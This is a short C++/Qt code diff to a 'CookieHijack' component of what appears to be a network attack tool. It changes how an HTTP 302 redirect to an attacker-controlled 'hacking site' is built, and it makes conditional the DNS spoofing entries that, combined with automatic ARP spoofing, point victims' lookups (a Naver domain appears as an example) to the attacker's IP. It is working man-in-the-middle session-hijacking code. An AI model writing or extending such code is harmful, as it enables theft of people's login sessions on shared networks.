@@ -50,9 +50,13 @@ bool CookieHijack::doOpen() {
 
 	QStringList httpResponse;
 	httpResponse += "HTTP/1.1 302 Redirect";
-	QString locationStr =  QString("Location: http://%1.%2").arg(prefix_).arg(hackingSite_);
+	QString locationStr;
+	if (prefix_ == "")
+		locationStr = QString("Location: http://%1").arg(hackingSite_);
+	else
+		locationStr =  QString("Location: http://%1.%2").arg(prefix_).arg(hackingSite_);
 	if (webServer_.httpPort_ != 80) locationStr += ":" + QString::number(webServer_.httpPort_);
-	locationStr += "/0";
+	locationStr += "/?";
 	httpResponse += locationStr;
 	httpResponse += "";
 	httpResponse += "";
@@ -62,8 +66,10 @@ bool CookieHijack::doOpen() {
 	if (!res) return false;
 
 	dnsBlock_.dnsBlockItems_.clear();
-	dnsBlock_.dnsBlockItems_.push_back(new GDnsBlockItem(this, prefix_ + ".*", QString(autoArpSpoof_.intf()->ip())));
-	dnsBlock_.dnsBlockItems_.push_back(new GDnsBlockItem(this, "_*", QString(autoArpSpoof_.intf()->ip()))); // _4433._https.wifi.naver.com
+	if (prefix_ != "") {
+		dnsBlock_.dnsBlockItems_.push_back(new GDnsBlockItem(this, prefix_ + ".*", QString(autoArpSpoof_.intf()->ip())));
+		dnsBlock_.dnsBlockItems_.push_back(new GDnsBlockItem(this, "_*", QString(autoArpSpoof_.intf()->ip()))); // _4433._https.wifi.naver.com
+	}
 
 	return true;
 }
